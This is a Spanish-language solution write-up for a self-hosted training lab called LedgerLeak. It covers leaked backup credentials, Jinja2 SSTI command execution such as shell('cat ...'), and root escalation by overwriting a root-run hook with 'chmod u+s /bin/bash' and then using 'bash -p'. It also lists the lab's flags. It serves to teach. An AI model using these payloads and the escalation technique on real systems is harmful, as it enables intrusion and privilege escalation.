# LedgerLeak - Writeup tecnico docente

## 1. Objetivo y criterio de resolucion

LedgerLeak entrena una cadena completa de pentesting web y Linux dentro de un
contenedor controlado:

1. descubrir una copia de seguridad expuesta;
2. extraer y reutilizar credenciales;
3. confirmar una SSTI autenticada;
4. ejecutar comandos como el usuario de servicio `appsvc`;
5. obtener la user flag;
6. abusar de un hook periodico ejecutado por root;
7. obtener la root flag y validar ambas evidencias desde la web.

El laboratorio se considera resuelto cuando la aplicacion muestra:

```text
LedgerLeak completado correctamente
```

Esta pantalla solo se habilita despues de introducir las dos flags correctas en
`/staff/preview`.

## 2. Despliegue

Desde PowerShell en Windows 11:

```powershell
cd C:\Users\afvle\tfm\labs\ledgerleak
docker compose up -d --build
docker compose ps
```

`cd` entra en la carpeta que contiene `docker-compose.yml`.
`docker compose up -d --build` construye la imagen y arranca el contenedor en
segundo plano. `docker compose ps` confirma que el servicio esta levantado y que
el puerto `8081` esta publicado.

Abrir:

```text
http://127.0.0.1:8081
```

## 3. Enumeracion inicial

La portada muestra exportaciones contables disponibles. El objetivo de esta fase
no es explotar inmediatamente, sino identificar recursos que no deberian formar
parte de la superficie publica.

Puede abrirse el recurso desde el navegador o consultarse con:

```powershell
curl.exe http://127.0.0.1:8081/exports/ledger_backup_2025-03.env
```

La respuesta contiene:

```text
STAFF_USER=auditor
STAFF_PASS=QuarterClose!2025
```

La evidencia importante es que un fichero de backup expuesto contiene
credenciales operativas. Encontrar el fichero no completa el acceso: el siguiente
paso consiste en comprobar si esas credenciales siguen siendo validas.

## 4. Acceso al panel staff

Abrir:

```text
http://127.0.0.1:8081/staff/login
```

Introducir:

```text
Usuario: auditor
Contrasena: QuarterClose!2025
```

Si las credenciales son correctas, la aplicacion redirige a:

```text
/staff/preview
```

Esto confirma que el secreto filtrado permite acceder a una funcionalidad
interna mediante una cuenta valida.

## 5. Confirmacion segura de SSTI

En el campo de previsualizacion introducir:

```jinja2
{{ 7*7 }}
```

Resultado esperado:

```text
49
```

Los delimitadores `{{` y `}}` indican una expresion Jinja2. La operacion `7*7`
es una prueba inocua: si aparece `49`, la entrada no se esta mostrando como texto,
sino que el servidor la esta evaluando como plantilla. Esta prueba confirma la
SSTI sin ejecutar todavia comandos del sistema.

## 6. Ejecucion de comandos y contexto de usuario

La aplicacion expone deliberadamente la funcion `shell` en el contexto de la
plantilla. Para comprobar el usuario efectivo del proceso:

```jinja2
{{ shell('id').read() }}
```

Significado de cada parte:

- `{{ ... }}` solicita a Jinja2 que evalue la expresion.
- `shell(...)` ejecuta el comando recibido mediante una funcion expuesta por el lab.
- `'id'` muestra UID, GID y grupos del proceso.
- `.read()` recupera la salida para que pueda mostrarse en la respuesta web.

Resultado esperado, con posibles variaciones numericas:

```text
uid=999(appsvc) gid=999(ledger) groups=999(ledger)
```

La salida confirma ejecucion como `appsvc`, no como root.

## 7. Obtencion de la user flag

Introducir:

```jinja2
{{ shell('cat /home/appsvc/user.txt').read() }}
```

`cat` imprime el contenido del fichero. La ruta se encuentra dentro del directorio
del usuario comprometido y es legible por `appsvc`.

Resultado esperado:

```text
DL{ledgerleak_user_initial_access}
```

Esta flag demuestra acceso inicial util dentro del entorno. Todavia no demuestra
control privilegiado.

## 8. Enumeracion para la escalada

La cadena prevista se apoya en un hook de mantenimiento. Puede revisarse con:

```jinja2
{{ shell('ls -l /opt/ledger/hooks/archive.sh').read() }}
```

La ruta pertenece a `root:ledger` y es escribible por el grupo `ledger`. Como
`appsvc` pertenece a ese grupo, puede modificar el hook aunque no sea root.

El proceso privilegiado ejecuta el hook aproximadamente cada 20 segundos. Esta
combinacion crea la condicion de escalada:

- un usuario no privilegiado puede escribir el fichero;
- un proceso root confia en ese fichero y lo ejecuta periodicamente.

## 9. Modificacion del hook privilegiado

Sobrescribir el hook para que, cuando root lo ejecute, active el bit SUID de bash:

```jinja2
{{ shell('echo "chmod u+s /bin/bash" > /opt/ledger/hooks/archive.sh').read() }}
```

El comando puede no devolver texto. Su efecto se produce cuando el proceso
privilegiado ejecuta el hook. Esperar entre 20 y 30 segundos.

Puede comprobarse el permiso resultante con:

```jinja2
{{ shell('ls -l /bin/bash').read() }}
```

La presencia de una `s` en el permiso del propietario indica que el bit SUID esta
activo, por ejemplo:

```text
-rwsr-xr-x ... /bin/bash
```

## 10. Obtencion de la root flag

Usar bash preservando el privilegio efectivo:

```jinja2
{{ shell('/bin/bash -p -c "cat /root/root.txt"').read() }}
```

Significado:

- `/bin/bash` inicia el interprete modificado por el hook.
- `-p` conserva los privilegios efectivos obtenidos mediante SUID.
- `-c` ejecuta la cadena que aparece a continuacion.
- `cat /root/root.txt` intenta leer un fichero reservado a root.

Resultado esperado:

```text
DL{ledgerleak_root_privilege_escalation}
```

La lectura de este fichero confirma que la escalada ha funcionado. Ejecutar
`cat /root/root.txt` directamente como `appsvc` produce `Permission denied`, por
lo que debe usarse `/bin/bash -p`.

## 11. Validacion final en la web

En `/staff/preview`, introducir:

```text
User flag: DL{ledgerleak_user_initial_access}
Root flag: DL{ledgerleak_root_privilege_escalation}
```

Pulsar `Validar completado`.

La pantalla final resume el flujo ofensivo y su relacion con MITRE ATT&CK. El lab
queda formalmente completado cuando aparece:

```text
LedgerLeak completado correctamente
```

## 12. Flags del laboratorio

Esta seccion aparece porque el documento es un solucionario docente. Para una
entrega sin spoilers debe retirarse o mantenerse en un repositorio privado.

```text
User flag: DL{ledgerleak_user_initial_access}
Root flag: DL{ledgerleak_root_privilege_escalation}
```

## 13. Problemas frecuentes

### Docker no encuentra el fichero de configuracion

Causa: PowerShell esta situado en otra carpeta.

Solucion:

```powershell
cd C:\Users\afvle\tfm\labs\ledgerleak
docker compose up -d --build
```

### La web no abre en el puerto 8081

Comprobar el estado y los logs:

```powershell
docker compose ps
docker logs --tail 50 ledgerleak
```

### El login indica credenciales invalidas

Usar exactamente:

```text
auditor
QuarterClose!2025
```

Si existe una sesion anterior, abrir `/staff/logout` y repetir el acceso.

### `{{ 7*7 }}` no devuelve `49`

Comprobar que se ha iniciado sesion y que el payload se introduce en el campo de
plantilla de `/staff/preview`.

### La user flag no aparece

Usar la ruta completa y conservar `.read()`:

```jinja2
{{ shell('cat /home/appsvc/user.txt').read() }}
```

### La root flag devuelve `Permission denied`

No usar `cat /root/root.txt` directamente. Esperar a que el hook se ejecute y usar:

```jinja2
{{ shell('/bin/bash -p -c "cat /root/root.txt"').read() }}
```

### Bash no muestra el bit SUID

Esperar 20-30 segundos y comprobar:

```jinja2
{{ shell('ls -l /bin/bash').read() }}
```

Si sigue sin aparecer, volver a enviar el payload que sobrescribe `archive.sh`.

### Las flags son correctas pero no aparece la pantalla final

Pegarlas sin espacios adicionales en los dos campos de validacion y pulsar
`Validar completado`. La sesion debe seguir autenticada como staff.

## 14. Limpieza

```powershell
cd C:\Users\afvle\tfm\labs\ledgerleak
docker compose down --rmi local -v
```

Este comando detiene el servicio, elimina la imagen local creada para el lab y
borra volumenes asociados. Un nuevo `docker compose up -d --build` restaura el
estado inicial.
